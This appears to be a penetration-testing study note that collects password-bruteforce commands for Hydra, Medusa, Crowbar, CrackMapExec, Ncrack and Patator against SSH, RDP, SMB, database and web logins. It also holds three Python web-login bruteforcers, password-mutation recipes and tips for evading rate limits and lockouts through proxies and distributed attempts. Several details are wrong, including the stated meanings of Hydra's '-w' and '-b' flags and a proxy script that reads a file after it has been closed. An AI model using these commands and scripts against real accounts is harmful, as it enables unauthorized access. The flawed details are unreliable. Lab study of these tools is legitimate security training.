# Bruteforce Tools Reference

## Table of Contents
- [[#Hydra|Hydra]]
- [[#Medusa|Medusa]]
- [[#Crowbar|Crowbar]]
- [[#CrackMapExec (CME)|CrackMapExec (CME)]]
- [[#Ncrack|Ncrack]]
- [[#Patator|Patator]]
- [[#Custom Python Script for Web Form Bruteforce|Custom Python Script for Web Form Bruteforce]]
- [[#Wordlist Locations|Wordlist Locations]]
- [[#Password Mutations|Password Mutations]]
- [[#Rate Limiting Bypass|Rate Limiting Bypass]]
- [[#Related Notes|Related Notes]]

---

## Hydra

The most popular network authentication bruteforcer.

### Basic Syntax

```bash
hydra -l USER -P wordlist.txt <protocol>://<target>
hydra -L users.txt -P wordlist.txt <protocol>://<target>
```

### SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.3
hydra -L users.txt -P pass.txt ssh://10.10.14.3 -t 4
hydra -l admin -P passwords.txt 10.10.14.3 ssh -V -f
```

| Flag | Description |
|------|-------------|
| `-l` | Single username |
| `-L` | Username list |
| `-p` | Single password |
| `-P` | Password list |
| `-t` | Tasks (threads) |
| `-V` | Verbose (show each attempt) |
| `-f` | Exit after first success |
| `-o` | Output file |
| `-s` | Custom port |

### FTP

```bash
hydra -l ftpuser -P rockyou.txt ftp://10.10.14.3
hydra -L users.txt -P passwords.txt ftp://10.10.14.3 -t 16
```

### HTTP POST (Web Form)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.14.3 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed" -t 64
```

**Breakdown:**
- `/login.php` — form action
- `user=^USER^&pass=^PASS^` — POST body with placeholders
- `:F=Login failed` — failure string (or `:S=Welcome` for success)
- `-t 64` — 64 threads

**Multiple failure strings:**

```bash
hydra -l admin -P passwords.txt 10.10.14.3 http-post-form "/login:username=^USER^&password=^PASS^&submit=Login:INVALID|incorrect|failed" -t 64
```

### HTTP GET

```bash
hydra -l admin -P passwords.txt 10.10.14.3 http-get "/protected/:F=401"
```

### HTTP Basic Auth

```bash
hydra -l admin -P rockyou.txt 10.10.14.3 http-get /protected/
```

### HTTP Headers (Custom)

```bash
hydra -l admin -P passwords.txt 10.10.14.3 http-head "/login.php"
```

### RDP

```bash
hydra -l administrator -P passwords.txt rdp://10.10.14.3
hydra -L users.txt -P rockyou.txt rdp://10.10.14.3 -t 1 -V
```

> [!warning]
> RDP is slow. Use `-t 1` to avoid lockouts.

### SMB

```bash
hydra -l administrator -P rockyou.txt smb://10.10.14.3
hydra -L users.txt -P passwords.txt smb://10.10.14.3 -t 1
```

### MySQL

```bash
hydra -l root -P passwords.txt mysql://10.10.14.3
```

### MSSQL

```bash
hydra -l sa -P rockyou.txt mssql://10.10.14.3
```

### Postgres

```bash
hydra -l postgres -P passwords.txt postgres://10.10.14.3
```

### VNC

```bash
hydra -P passwords.txt vnc://10.10.14.3
```

### SMTP

```bash
hydra -l user@domain.com -P passwords.txt smtp://10.10.14.3 -V
```

### LDAP

```bash
hydra -L users.txt -P passwords.txt ldap://10.10.14.3
```

### SNMP

```bash
hydra -P passwords.txt snmp://10.10.14.3
```

---

## Medusa

Parallel network login auditor — similar to Hydra but with different modules.

### Syntax

```bash
medusa -h <host> -u <user> -P <passlist> -M <module>
medusa -H <hosts_file> -U <users_file> -P <passlist> -M <module>
```

### SSH

```bash
medusa -h 10.10.14.3 -u root -P passwords.txt -M ssh
medusa -h 10.10.14.3 -U users.txt -P rockyou.txt -M ssh -t 5
```

| Flag | Description |
|------|-------------|
| `-h` | Target host |
| `-H` | Host list file |
| `-u` | Single username |
| `-U` | Username list file |
| `-p` | Single password |
| `-P` | Password list file |
| `-M` | Module name |
| `-t` | Threads |
| `-f` | Stop after first success |
| `-n` | Port number |
| `-o` | Output file |
| `-g` | Group (number of tries before delay) |
| `-r` | Retry delay |

### FTP

```bash
medusa -h 10.10.14.3 -u admin -P passwords.txt -M ftp
```

### HTTP

```bash
medusa -h 10.10.14.3 -U users.txt -P passwords.txt -M http -m DIR:/login -m FORM:username -m FORM:password -m DENY_SIGNAL:Invalid
```

### MySQL

```bash
medusa -h 10.10.14.3 -u root -P passwords.txt -M mysql
```

### SMTP

```bash
medusa -h 10.10.14.3 -u user@domain.com -P passwords.txt -M smtp
```

### Web Application

```bash
medusa -h 10.10.14.3 -U users.txt -P rockyou.txt -M web-form \
  -m FORM:"username=DEFAULT&password=DEFAULT" \
  -m DENY_SIGNAL:"Login failed" \
  -m ACTION:"/login.php"
```

### List Modules

```bash
medusa -d
```

---

## Crowbar

Specialized for **RDP** and **SSH** bruteforcing with private key support.

### RDP Bruteforce

```bash
crowbar -b rdp -s 10.10.14.3/32 -u administrator -C passwords.txt -n 1
```

| Flag | Description |
|------|-------------|
| `-b` | Protocol (rdp, ssh, vnc, openvpn) |
| `-s` | Target(s) |
| `-u` | Username |
| `-U` | Username list |
| `-C` | Password list |
| `-k` | Private key for SSH |
| `-n` | Thread count |
| `-l` | Log file |
| `-v` | Verbose |
| `-t` | Timeout |

### RDP with custom port

```bash
crowbar -b rdp -s 10.10.14.3:3390 -u administrator -C passwords.txt
```

### SSH with password list

```bash
crowbar -b ssh -s 10.10.14.3 -u root -C passwords.txt
```

### SSH with private key

```bash
crowbar -b ssh -s 10.10.14.3 -u root -k id_rsa -l key_test.log
```

### VNC Bruteforce

```bash
crowbar -b vnc -s 10.10.14.3 -C passwords.txt
```

---

## CrackMapExec (CME)

Post-exploitation tool that also bruteforces. More subtle than Hydra.

### SMB Bruteforce

```bash
crackmapexec smb 10.10.14.3 -u users.txt -p passwords.txt
crackmapexec smb 10.10.14.3 -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb 10.10.14.3 -u user -p ''  # Blank password
```

| Flag | Description |
|------|-------------|
| `-u` | Username(s) |
| `-p` | Password(s) |
| `--continue-on-success` | Keep going after hits |
| `-d` | Domain |
| `--local-auth` | Local auth instead of domain |
| `--sam` | Dump SAM |
| `--lsa` | Dump LSA |
| `--shares` | List shares |
| `-x` | Execute command |
| `-X` | Execute command with output |

### WINRM Bruteforce

```bash
crackmapexec winrm 10.10.14.3 -u users.txt -p passwords.txt
crackmapexec winrm 10.10.14.3 -u users.txt -p passwords.txt --continue-on-success
```

### SSH Bruteforce

```bash
crackmapexec ssh 10.10.14.3 -u users.txt -p passwords.txt
```

### MSSQL Bruteforce

```bash
crackmapexec mssql 10.10.14.3 -u sa -p passwords.txt
crackmapexec mssql 10.10.14.3 -u users.txt -p passwords.txt --local-auth
```

### RDP Bruteforce

```bash
# Note: CME uses RDP module through SMB
crackmapexec smb 10.10.14.3 -u users.txt -p passwords.txt
```

---

## Ncrack

High-speed network authentication cracking tool.

### RDP

```bash
ncrack -u administrator -P passwords.txt rdp://10.10.14.3
```

### SSH

```bash
ncrack -U users.txt -P rockyou.txt ssh://10.10.14.3 -p 2222
```

### HTTP

```bash
ncrack -U users.txt -P passwords.txt http://10.10.14.3/login
```

---

## Patator

Multi-purpose bruteforcer with more control over responses.

### SSH

```bash
patator ssh_login host=10.10.14.3 user=root password=FILE0 0=passwords.txt -x ignore:fgrep='Authentication failed'
```

### FTP

```bash
patator ftp_login host=10.10.14.3 user=admin password=FILE0 0=passwords.txt
```

### HTTP POST

```bash
patator http_fuzz url=http://10.10.14.3/login.php method=POST body='user=admin&pass=FILE0' 0=rockyou.txt -x ignore:fgrep='Login failed'
```

---

## Custom Python Script for Web Form Bruteforce

### Basic Web Form Bruteforcer

```python
#!/usr/bin/env python3
import requests
import sys

def brute_force(target_url, username_field, password_field, username, wordlist):
    with open(wordlist, 'r', encoding='latin-1') as f:
        for password in f:
            password = password.strip()
            data = {username_field: username, password_field: password}
            try:
                r = requests.post(target_url, data=data, timeout=5)
                if "Login failed" not in r.text and "Invalid" not in r.text:
                    print(f"[+] SUCCESS: {username}:{password}")
                    return
                else:
                    print(f"[-] {username}:{password}")
            except requests.exceptions.RequestException as e:
                print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print(f"Usage: {sys.argv[0]} <url> <username_field> <password_field> <username> <wordlist>")
        sys.exit(1)
    brute_force(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
```

### Advanced Web Form Bruteforcer with Session Handling

```python
#!/usr/bin/env python3
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def advanced_brute(target, username_field, password_field, username, wordlist, 
                   csrf_field=None, csrf_url=None, csrf_regex=None,
                   success_string="Welcome", failure_string="Login failed",
                   delay=0):
    """
    Advanced web form bruteforcer with CSRF token handling
    """
    session = requests.Session()
    
    with open(wordlist, 'r', encoding='latin-1') as f:
        for password in f:
            password = password.strip()
            data = {username_field: username, password_field: password}
            
            # Handle CSRF token if needed
            if csrf_field and csrf_url:
                import re
                r = session.get(csrf_url, verify=False)
                match = re.search(csrf_regex, r.text)
                if match:
                    data[csrf_field] = match.group(1)
            
            try:
                r = session.post(target, data=data, verify=False, timeout=5)
                
                if success_string in r.text and failure_string not in r.text:
                    print(f"[+] VALID CREDENTIALS: {username}:{password}")
                    return password
                else:
                    print(f"[-] {username}:{password}")
                
                import time
                if delay:
                    time.sleep(delay)
                    
            except Exception as e:
                print(f"[!] Error: {e}")
    
    return None

if __name__ == "__main__":
    # Example usage for a WordPress login
    result = advanced_brute(
        target="http://target.com/wp-login.php",
        username_field="log",
        password_field="pwd",
        username="admin",
        wordlist="/usr/share/wordlists/rockyou.txt",
        success_string="Dashboard",
        failure_string="ERROR"
    )
```

### Python Requests Brute Force with Proxy Support

```python
#!/usr/bin/env python3
import requests
import sys

def brute_with_proxy(target, users, wordlist, proxy=None):
    """Brute force with optional proxy (Burp) for debugging"""
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    with open(users, 'r') as u_file, open(wordlist, 'r', encoding='latin-1') as p_file:
        passwords = [p.strip() for p in p_file]
        
    for user in u_file:
        user = user.strip()
        for password in passwords:
            data = {"username": user, "password": password}
            try:
                r = requests.post(target, data=data, proxies=proxies, verify=False, timeout=5)
                if "Invalid" not in r.text:
                    print(f"[+] {user}:{password}")
                    return
            except Exception as e:
                print(f"[!] {e}")

if __name__ == "__main__":
    brute_with_proxy("http://target.com/login", "users.txt", "passwords.txt", 
                     proxy="http://127.0.0.1:8080")
```

---

## Wordlist Locations

### Kali Linux default wordlists

```bash
/usr/share/wordlists/rockyou.txt.gz      # Most common (need to gunzip first)
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/metasploit/         # Metasploit wordlists
/usr/share/wordlists/dirb/              # Web directory wordlists
/usr/share/seclists/                    # SecLists (if installed)
/usr/share/wordlists/nmap.lst
```

### Extract rockyou

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### SecLists installation

```bash
sudo apt install seclists
# Located at: /usr/share/seclists/
```

### Custom wordlist generation

```bash
# Using cewl (scrape words from a website)
cewl http://target.com -w custom_wordlist.txt

# Using crunch
crunch 8 8 abcdef123 -o 8char.txt

# Using hashcat rules
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > mutated.txt
```

---

## Password Mutations

### Hashcat rule-based mutation

```bash
# Apply rules to a wordlist
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule base-words.txt > mutated.txt
hashcat --stdout -r /usr/share/hashcat/rules/d3ad0ne.rule base-words.txt > mutated.txt
```

### Manual mutations with John

```bash
john --wordlist=base.txt --rules --stdout > mutated.txt
```

### Common mutations to try

```text
password        # Original
Password        # Capitalized
PASSWORD        # Uppercase
password1       # +digit
password123     # +common digits
Password1       # Capital + digit
Password123!    # Capital + digits + special
P@ssword        # Leet speak
password2019    # +year
password2020
Summer2020
Winter2021
```

---

## Rate Limiting Bypass

### Add delay between attempts

```bash
# Hydra with delay
hydra -l admin -P passwords.txt -t 1 -w 10 ssh://10.10.14.3
# -w 10 = 10 second wait between attempts
```

### Rotate IPs

```bash
# Via proxy chain
proxychains hydra -l admin -P passwords.txt ssh://10.10.14.3

# Via different source ports
hydra -l admin -P passwords.txt -s 22 ssh://10.10.14.3 -b
```

### Distributed bruteforce

```bash
# Split wordlist across multiple machines
split -n l/4 rockyou.txt part_

# Each machine tests a part
hydra -l admin -P part_aa ssh://target
hydra -l admin -P part_ab ssh://target
```

---

## Related Notes

- [[04 - Password Attacks/4.1 Online Attacks/Online Password Attacks]]
- [[04 - Password Attacks/4.2 Offline Attacks/Offline Password Attacks]]
- [[04 - Password Attacks/4.3 Hash Cracking/Hash Cracking Reference]]
- [[04 - Password Attacks/4.4 Kerberos Attacks/Kerberos Attacks]]
